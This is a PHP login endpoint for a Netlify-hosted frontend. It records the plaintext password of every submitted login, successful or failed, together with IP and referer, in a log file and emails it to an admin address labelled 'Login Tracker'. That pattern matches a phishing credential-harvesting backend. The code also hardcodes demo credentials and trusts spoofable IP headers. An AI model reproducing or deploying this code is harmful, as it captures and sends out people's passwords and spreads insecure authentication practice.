<?php
// Use Composer autoload
require __DIR__ . '/vendor/autoload.php';

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;
use Dotenv\Dotenv;

// Load environment variables
$dotenv = Dotenv::createImmutable(__DIR__);
$dotenv->load();

// --- CORS headers for frontend security (replace with your actual domain) ---
header("Access-Control-Allow-Origin: https://strong-dasik-90f620.netlify.app/");
header("Access-Control-Allow-Methods: POST, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type");

// Handle preflight OPTIONS request
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

// Start PHP session for attempt tracking
session_start();
if (!isset($_SESSION['correct_attempts'])) {
    $_SESSION['correct_attempts'] = 0; // Initialize counter
}

// Prepare email sending function using PHPMailer
function sendAdminNotification($subject, $body) {
    $mail = new PHPMailer(true);
    try {
        // Load environment variables
        $smtpHost = $_ENV['SMTP_HOST'];
        $smtpPort = $_ENV['SMTP_PORT'];
        $smtpUser = $_ENV['SMTP_USERNAME'];
        $smtpPass = $_ENV['SMTP_PASSWORD'];
        $adminEmail = $_ENV['ADMIN_EMAIL'];

        // Server settings
        $mail->isSMTP();
        $mail->Host = $smtpHost;
        $mail->SMTPAuth = true;
        $mail->Username = $smtpUser;
        $mail->Password = $smtpPass;
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
        $mail->Port = $smtpPort;

        // Recipients
        $mail->setFrom($smtpUser, 'Login Tracker');
        $mail->addAddress($adminEmail); // Admin email

        // Content
        $mail->isHTML(false);
        $mail->Subject = $subject;
        $mail->Body    = $body;

        $mail->send();
        return true;
    } catch (Exception $e) {
        // Log error or handle gracefully
        error_log("Mailer Error: {$mail->ErrorInfo}");
        return false;
    }
}

// Example: Handling login request
$inputBody = file_get_contents('php://input');
$inputData = json_decode($inputBody, true);

$sessionCorrectAttempts = &$_SESSION['correct_attempts'];

$response = ['success' => false, 'message' => ''];
$logDetails = '';

// Get user IP
function getUserIp() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) return $_SERVER['HTTP_CLIENT_IP'];
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) return $_SERVER['HTTP_X_FORWARDED_FOR'];
    return $_SERVER['REMOTE_ADDR'];
}

// Get referer URL
$referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'Unknown';

if (!isset($inputData['email']) || !isset($inputData['password'])) {
    $response['message'] = "Email and password are required.";
    $logDetails = "ERROR: Missing email or password. IP: " . getUserIp() . ", Referer: $referer";
} else {
    $email = htmlspecialchars($inputData['email']);
    $password = htmlspecialchars($inputData['password']);
    $ip = getUserIp();

    // Validate credentials (replace this with your real validation)
    $validEmails = [
        "user1@example.com" => "password123",
        "user2@example.com" => "secret456"
    ];

    if (isset($validEmails[$email]) && $validEmails[$email] === $password) {
        $response['success'] = true;
        $response['message'] = "Authentication successful.";
        $_SESSION['correct_attempts']++;
        $logDetails = "SUCCESS: User '$email' logged in. IP: $ip, Referer: $referer, Password: $password";
    } else {
        $response['message'] = "Invalid credentials.";
        $_SESSION['correct_attempts'] = 0; // Reset on failure or keep as needed
        $logDetails = "ERROR: Failed login for '$email'. IP: $ip, Referer: $referer, Password: $password";
    }
}

// Log attempt
$logFile = __DIR__ . '/access.log';
file_put_contents($logFile, date('Y-m-d H:i:s') . " - " . $logDetails . PHP_EOL);

// Send email notification
$subject = "Login Attempt - " . ($response['success'] ? "Success" : "Failure");
$body = "Time: " . date('Y-m-d H:i:s') . "\n" .
        "Status: " . ($response['success'] ? "Success" : "Failure") . "\n" .
        "Email: $email\n" .
        "Password: $password\n" .
        "IP Address: $ip\n" .
        "Referer URL: $referer\n" .
        "Correct Attempts: " . $_SESSION['correct_attempts'] . "\n\n" .
        "Details:\n$logDetails";

sendAdminNotification($subject, $body);

// Return response
header('Content-Type: application/json');
echo json_encode($response);
?>